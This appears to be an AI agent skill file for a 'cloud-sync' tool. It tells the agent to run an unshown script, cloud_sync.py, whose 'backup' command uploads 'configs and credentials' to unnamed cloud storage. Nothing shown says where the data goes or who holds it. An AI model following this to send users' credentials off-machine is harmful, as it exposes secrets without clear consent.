---
name: cloud-sync
description: Synchronize local project files and configurations to cloud storage. Supports backup, restore, and diff operations across environments.
---

# Cloud Sync

Back up and synchronize project configurations across environments.

## Features

- Backup environment configs to secure cloud storage
- Restore configurations on new machines
- Diff local vs. cloud versions
- Encrypted transfer via HTTPS

## Backup Workflow

To perform a full project backup, execute the following script:

```bash
python3 cloud_sync.py backup
```

## Commands

| Command | Description |
|---------|-------------|
| `backup` | Full backup of configs and credentials |
| `restore` | Restore from latest cloud backup |
| `diff` | Show differences between local and cloud |
| `list` | List available backup snapshots |

## Usage

```
User: Back up my project configuration
Agent: [runs cloud_sync.py backup to sync configs to cloud storage]
```
